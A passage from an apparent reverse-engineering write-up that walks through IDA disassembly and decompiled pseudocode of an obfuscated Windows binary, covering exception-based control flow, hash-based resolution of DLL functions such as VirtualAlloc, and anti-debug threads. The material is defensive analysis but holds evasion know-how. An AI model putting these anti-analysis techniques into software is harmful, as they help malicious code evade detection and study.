class="built_in">cs</span>:loc_1400BB760</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB757                 <span class="built_in">db</span>  <span class="number">30h</span> <span class="comment">; 0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB758                 <span class="built_in">db</span>  <span class="number">53h</span> <span class="comment">; S</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB759 loc_1400BB759:                          <span class="comment">; CODE XREF: sub_1400BB6A0+DA↓j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB759                 <span class="keyword">inc</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB75C                 <span class="keyword">cmp</span>     <span class="built_in">rbx</span>, <span class="number">4</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB760 loc_1400BB760:                          <span class="comment">; DATA XREF: sub_1400BB6A0+B1↑r</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB760                 <span class="keyword">jnz</span>     short loc_1400BB700</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB762                 <span class="keyword">jmp</span>     short loc_1400BB77C</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB764 <span class="comment">;   __except(1) // owned by 1400BB736</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB764                 <span class="keyword">lea</span>     <span class="built_in">rax</span>, unk_140111680</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB764                                         <span class="comment">; DATA XREF: .rdata:00000001401208D0↓o</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB76B                 <span class="keyword">call</span>    <span class="built_in">qword</span> <span class="built_in">ptr</span> [<span class="built_in">r13</span>+<span class="built_in">rax</span>+<span class="number">8</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB770                 <span class="keyword">xor</span>     <span class="built_in">al</span>, [<span class="built_in">r12</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB774                 <span class="keyword">mov</span>     <span class="built_in">rcx</span>, [<span class="built_in">rsi</span>]</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB777                 <span class="keyword">mov</span>     [<span class="built_in">rcx</span>+<span class="built_in">rbx</span>], <span class="built_in">al</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB77A                 <span class="keyword">jmp</span>     short loc_1400BB759</span><br><span class="line"><span class="symbol">.text:</span>00000001400BB77C loc_1400BB77C:                          <span class="comment">; CODE XREF: sub_1400BB6A0+70↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB77C                                         <span class="comment">; sub_1400BB6A0+C2↑j</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB77C                 <span class="keyword">mov</span>     <span class="built_in">rax</span>, <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB77F                 <span class="keyword">add</span>     <span class="built_in">rsp</span>, <span class="number">28h</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB783                 <span class="keyword">pop</span>     <span class="built_in">rbx</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB784                 <span class="keyword">pop</span>     <span class="built_in">rdi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB785                 <span class="keyword">pop</span>     <span class="built_in">rsi</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB786                 <span class="keyword">pop</span>     <span class="built_in">r12</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB788                 <span class="keyword">pop</span>     <span class="built_in">r13</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78A                 <span class="keyword">pop</span>     <span class="built_in">r14</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78C                 <span class="keyword">pop</span>     <span class="built_in">r15</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78E                 <span class="keyword">pop</span>     <span class="built_in">rbp</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78F                 <span class="keyword">retn</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78F <span class="comment">; &#125; // starts at 1400BB6A0</span></span><br><span class="line"><span class="symbol">.text:</span>00000001400BB78F sub_1400BB6A0   endp</span><br></pre></td></tr></table></figure>

<p>In fact, this function relies on exception, and sub is a dll function hash parser, in all cases of <code>longfunc_3C615</code>, its corresponding function is <code>kernel32_VirtualAlloc</code>.  After passing the exception to the program, the program successfully runs into main. In main, the program has a loop function in a <code>while 1</code> loop, and <code>sub_140108DE0</code> is called in the loop, this function will create many threads to anti-debug:</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">call_func_tables</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v56 = <span class="number">-2</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">DuplicateHandle</span>((_Mtx_t)&amp;dword_14012B420) )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_74;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">HIDWORD</span>(qword_14012B468) == <span class="number">0x7FFFFFFF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">LABEL_75:</span><br><span class="line">      <span class="built_in">HIDWORD</span>(qword_14012B468) = <span class="number">2147483646</span>;</span><br><span class="line">      <span class="built_in">IsDBCSLeadByteEx</span>(<span class="number">6u</span>, TestChar);</span><br><span class="line">      __debugbreak();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( p_??_R0?AVbad_array_new_length@std@@@<span class="number">8</span> = &amp;func_table;</span><br><span class="line">          p_??_R0?AVbad_array_new_length@std@@@<span class="number">8</span> != (__int64 (__fastcall **)())&amp;std::bad_array_new_length `RTTI Type Descriptor<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">          p_??_R0?AVbad_array_new_length@std@@@8 += 2 )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( *((_BYTE *)p_??_R0?AVbad_array_new_length@std@@@8 + 12) || (byte_14012B5FD &amp; 1) == 0 )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        *((_BYTE *)p_??_R0?AVbad_array_new_length@std@@@8 + 12) = 0;</span></span><br><span class="line"><span class="string">        v2 = *((_DWORD *)p_??_R0?AVbad_array_new_length@std@@@8 + 2);</span></span><br><span class="line"><span class="string">        v3 = *p_??_R0?AVbad_array_new_length@std@@@8;</span></span><br><span class="line"><span class="string">        ArgList = operator new(0x18u);</span></span><br><span class="line"><span class="string">        *(_DWORD *)ArgList = v2;</span></span><br><span class="line"><span class="string">        ArgList[1] = v3;</span></span><br><span class="line"><span class="string">        ArgList[2] = sub_1401044F0;</span></span><br><span class="line"><span class="string">        *(_QWORD *)ThrdAddr = beginthreadex(0, 0, sub_140109590, ArgList, 0, &amp;ThrdAddr[2]);</span></span><br><span class="line"><span class="string">        if ( !*(_QWORD *)ThrdAddr )</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          ThrdAddr[2] = 0;</span></span><br><span class="line"><span class="string">          IsDBCSLeadByteEx(6u, TestChar_1);</span></span><br><span class="line"><span class="string">LABEL_72:</span></span><br><span class="line"><span class="string">          IsDBCSLeadByteEx(1u, TestChar_2);</span></span><br><span class="line"><span class="string">LABEL_73:</span></span><br><span class="line"><span class="string">          IsDBCSLeadByteEx(1u, TestChar_1);</span></span><br><span class="line"><span class="string">LABEL_74:</span></span><br><span class="line"><span class="string">          IsDBCSLeadByteEx(5u, TestChar);</span></span><br><span class="line"><span class="string">          goto LABEL_75;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ( !ThrdAddr[2] )</span></span><br><span class="line"><span class="string">          goto LABEL_73;</span></span><br><span class="line"><span class="string">        __asm</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          vmovups xmm0, xmmword ptr [rbp+40h+var_50]</span></span><br><span class="line"><span class="string">          vmovaps xmmword ptr [rbp+40h+Buffer._Hnd], xmm0</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        if ( SetLastError(&amp;Buffer) )</span></span><br><span class="line"><span class="string">          goto LABEL_72;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    if ( (byte_14012B5FD &amp; 1) != 0 )</span></span><br><span class="line"><span class="string">      goto LABEL_42;</span></span><br><span class="line"><span class="string">    j = 0;</span></span><br><span class="line"><span class="string">    __asm &#123; rdgsbase rbx &#125;</span></span><br><span class="line"><span class="string">    v10 = -38083264;</span></span><br><span class="line"><span class="string">    for ( i = **(__int64 ***)(*(_QWORD *)(*(_QWORD *)(_RBX + 96) + 24LL) + 16LL); ; i = (__int64 *)*i )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( !j )</span></span><br><span class="line"><span class="string">        goto LABEL_78;</span></span><br><span class="line"><span class="string">      v12 = -1145602568;</span></span><br><span class="line"><span class="string">      if ( (unsigned __int16)(*((_WORD *)i + 44) - 8) &gt;= 2u )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v13 = 0;</span></span><br><span class="line"><span class="string">        do</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          v12 = 16777619 * (v12 ^ *(char *)(i[12] + v13));</span></span><br><span class="line"><span class="string">          v13 += 2;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        while ( 2 * ((unsigned __int64)(unsigned __int16)(*((_WORD *)i + 44) - 8) &gt;&gt; 1) != v13 );</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      if ( v12 == j )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">LABEL_78:</span></span><br><span class="line"><span class="string">        v14 = i[6];</span></span><br><span class="line"><span class="string">        v15 = *(int *)(v14 + 60);</span></span><br><span class="line"><span class="string">        v16 = *(unsigned int *)(v14 + v15 + 136);</span></span><br><span class="line"><span class="string">        v17 = (unsigned int *)(v14 + v16);</span></span><br><span class="line"><span class="string">        if ( *(_DWORD *)(v14 + v15 + 136) )</span></span><br><span class="line"><span class="string">          break;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">LABEL_17:</span></span><br><span class="line"><span class="string">      ;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    v18 = *(unsigned int *)(v14 + v15 + 140);</span></span><br><span class="line"><span class="string">    v19 = v17[6];</span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( v19-- == 0 )</span></span><br><span class="line"><span class="string">        goto LABEL_17;</span></span><br><span class="line"><span class="string">      v22 = *(unsigned int *)(v14 + v17[8] + 4 * v19);</span></span><br><span class="line"><span class="string">      v23 = *(_BYTE *)(v14 + v22);</span></span><br><span class="line"><span class="string">      if ( v23 )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v24 = (char *)(v14 + 1 + v22);</span></span><br><span class="line"><span class="string">        v20 = -1145602568;</span></span><br><span class="line"><span class="string">        do</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          v20 = 16777619 * (v20 ^ v23);</span></span><br><span class="line"><span class="string">          v23 = *v24++;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        while ( v23 );</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v20 = -1145602568;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    while ( v20 != v10 );</span></span><br><span class="line"><span class="string">    v25 = *(unsigned int *)(v14 + v17[7] + 4LL * *(unsigned __int16 *)(v14 + v17[9] + 2LL * (unsigned int)v19));</span></span><br><span class="line"><span class="string">    v26 = (char *)(v25 + v14);</span></span><br><span class="line"><span class="string">    if ( (unsigned int)v16 &lt; (unsigned int)v25 &amp;&amp; (char *)v17 + v18 &gt; v26 )</span></span><br><span class="line"><span class="string">      break;</span></span><br><span class="line"><span class="string">    ((void (__fastcall *)(_QWORD))v26)(*((_QWORD *)&amp;xmmword_14012B2B8 + 1));</span></span><br><span class="line"><span class="string">    v31 = byte_14012B5FC;</span></span><br><span class="line"><span class="string">    v30 = _InterlockedCompareExchange8(&amp;byte_14012B5FD, 1, byte_14012B5FC);</span></span><br><span class="line"><span class="string">    if ( v31 != v30 )</span></span><br><span class="line"><span class="string">      byte_14012B5FC = v30;</span></span><br><span class="line"><span class="string">LABEL_42:</span></span><br><span class="line"><span class="string">    n24000000 = GetProcessAffinityMask();</span></span><br><span class="line"><span class="string">    v33 = TlsSetValue();</span></span><br><span class="line"><span class="string">    v34 = v33;</span></span><br><span class="line"><span class="string">    if ( n24000000 == 10000000 )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      v35 = 100 * v33;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else if ( n24000000 == 24000000 )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      v35 = 1000000000 * (v33 / 24000000) + 1000000000 * (v33 % 24000000) / 24000000;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    else</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      if ( (n24000000 | (unsigned __int64)v33) &gt;&gt; 32 )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v49 = v33 / n24000000;</span></span><br><span class="line"><span class="string">        v50 = v34 % n24000000;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v50 = (unsigned int)v33 % (unsigned int)n24000000;</span></span><br><span class="line"><span class="string">        v49 = (unsigned int)v33 / (unsigned int)n24000000;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      v51 = 1000000000 * v49;</span></span><br><span class="line"><span class="string">      v52 = 1000000000 * v50;</span></span><br><span class="line"><span class="string">      if ( ((1000000000 * v50) | (unsigned __int64)n24000000) &gt;&gt; 32 )</span></span><br><span class="line"><span class="string">        v53 = v52 / n24000000;</span></span><br><span class="line"><span class="string">      else</span></span><br><span class="line"><span class="string">        v53 = (unsigned int)v52 / (unsigned int)n24000000;</span></span><br><span class="line"><span class="string">      v35 = v51 + v53;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    v36 = v35 + 500000000;</span></span><br><span class="line"><span class="string">    if ( v35 &gt;= 0x7FFFFFFFE2329AFFLL )</span></span><br><span class="line"><span class="string">      v36 = 0x7FFFFFFFFFFFFFFFLL;</span></span><br><span class="line"><span class="string">    while ( 1 )</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      n24000000_1 = GetProcessAffinityMask();</span></span><br><span class="line"><span class="string">      v39 = TlsSetValue();</span></span><br><span class="line"><span class="string">      v40 = v39;</span></span><br><span class="line"><span class="string">      if ( n24000000_1 == 10000000 )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v41 = 100 * v39;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else if ( n24000000_1 == 24000000 )</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        v41 = 1000000000 * (v39 / 24000000) + 1000000000 * (v39 % 24000000) / 24000000;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      else</span></span><br><span class="line"><span class="string">      &#123;</span></span><br><span class="line"><span class="string">        if ( (n24000000_1 | (unsigned __int64)v39) &gt;&gt; 32 )</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          v44 = v39 / n24000000_1;</span></span><br><span class="line"><span class="string">          v45 = v40 % n24000000_1;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        else</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">          v45 = (unsigned int)v39 % (unsigned int)n24000000_1;</span></span><br><span class="line"><span class="string">          v44 = (unsigned int)v39 / (unsigned int)n24000000_1;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">        v46 = 1000000000 * v44;</span></span><br><span class="line"><span class="string">        v47 = 1000000000 * v45;</span></span><br><span class="line"><span class="string">        v48 = ((1000000000 * v45) | (unsigned __int64)n24000000_1) &gt;&gt; 32</span></span><br><span class="line"><span class="string">            ? v47 / n24000000_1</span></span><br><span class="line"><span class="string">            : (unsigned int)v47 / (unsigned int)n24000000_1;</span></span><br><span class="line"><span class="string">        v41 = v46 + v48;</span></span><br><span class="line"><span class="string">      &#125;</span></span><br><span class="line"><span class="string">      v42 = v36 - v41;</span></span><br><span class="line"><span class="string">      if ( v36 &lt;= v41 )</span></span><br><span class="line"><span class="string">        break;</span></span><br><span class="line"><span class="string">      v43 = 100 * GetHandleInformation();</span></span><br><span class="line"><span class="string">      if ( v42 &gt;= 864000000000000LL )</span></span><br><span class="line"><span class="string">        v42 = 864000000000000LL;</span></span><br><span class="line"><span class="string">      v37 = v42 + v43;</span></span><br><span class="line"><span class="string">      Buffer._Hnd = (void *)(v37 / 1000000000);</span></span><br><span class="line"><span class="string">      Buffer._Id = v37 % 1000000000;</span></span><br><span class="line"><span class="string">      ResetEvent((const xtime *)&amp;Buffer);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    GetThreadPriority((_Mtx_t)&amp;dword_14012B420);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  n46 = *v26;</span></span><br><span class="line"><span class="string">  v10 = 0xBBB77DF8;</span></span><br><span class="line"><span class="string">  for ( j = 0xBBB77DF8; n46 != 46; ++v26 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    j = 0x1000193 * (j ^ n46);</span></span><br><span class="line"><span class="string">    n46 = v26[1];</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  v28 = v26[1];</span></span><br><span class="line"><span class="string">  if ( v28 )</span></span><br><span class="line"><span class="string">  &#123;</span></span><br><span class="line"><span class="string">    v29 = v26 + 2;</span></span><br><span class="line"><span class="string">    v10 = 0xBBB77DF8;</span></span><br><span class="line"><span class="string">    do</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      v10 = 0x1000193 * (v10 ^ v28);</span></span><br><span class="line"><span class="string">      v28 = *v29++;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    while ( v28 );</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  i = ***(__int64 ****)(*(_QWORD *)(*(_QWORD *)(_RBX + 96) + 24LL) + 16LL);</span></span><br><span class="line"><span class="string">  goto LABEL_17;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">.data:</span>00007FF737ACA4A0 func_table <span class="built_in">dq</span> offset func_table_1_longfunc_9663</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4A8 <span class="built_in">dq</span> <span class="number">77190988h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4B0 <span class="built_in">dq</span> offset func_table_2</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4B8 <span class="built_in">dq</span> <span class="number">77190989h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4C0 <span class="built_in">dq</span> offset func_table_3</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4C8 <span class="built_in">dq</span> <span class="number">7719098Ah</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4D0 <span class="built_in">dq</span> offset func_table_4</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4D8 <span class="built_in">dq</span> <span class="number">7719098Bh</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4E0 <span class="built_in">dq</span> offset func_table_5</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4E8 <span class="built_in">dq</span> <span class="number">7719098Ch</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4F0 <span class="built_in">dq</span> offset func_table_6</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA4F8 <span class="built_in">dq</span> <span class="number">7719098Dh</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA500 <span class="built_in">dq</span> offset func_table_7_longfunc_B6EE</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA508 <span class="built_in">dq</span> <span class="number">7719098Eh</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA510 <span class="built_in">dq</span> offset func_table_8</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA518 <span class="built_in">dq</span> <span class="number">7719098Fh</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA520 <span class="built_in">dq</span> offset func_table_9</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA528 <span class="built_in">dq</span> <span class="number">77190980h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA530 <span class="built_in">dq</span> offset func_table_10</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA538 <span class="built_in">dq</span> <span class="number">77190981h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA540 <span class="built_in">dq</span> offset func_table_11</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA548 <span class="built_in">dq</span> <span class="number">77190982h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA550 <span class="built_in">dq</span> offset func_table_12</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA558 <span class="built_in">dq</span> <span class="number">77190983h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA560 <span class="built_in">dq</span> offset func_table_13</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA568 <span class="built_in">dq</span> <span class="number">77190984h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA570 <span class="built_in">dq</span> offset func_table_14</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA578 <span class="built_in">dq</span> <span class="number">77190985h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA580 <span class="built_in">dq</span> offset func_table_15</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA588 <span class="built_in">dq</span> <span class="number">77190986h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA590 <span class="built_in">dq</span> offset func_table_16</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA598 <span class="built_in">dq</span> <span class="number">77190987h</span></span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA5A0 <span class="built_in">dq</span> offset func_table_17</span><br><span class="line"><span class="symbol">.data:</span>00007FF737ACA5A8 <span class="built_in">dq</span> <span class="number">77190998h</span></span><br></pre></td></tr></table></figure>

<p>These functions are almost all long functions, and deeply obfuscated.</p>
<p>After the <code>call_func_tables</code> there are some cipher strings:</p>
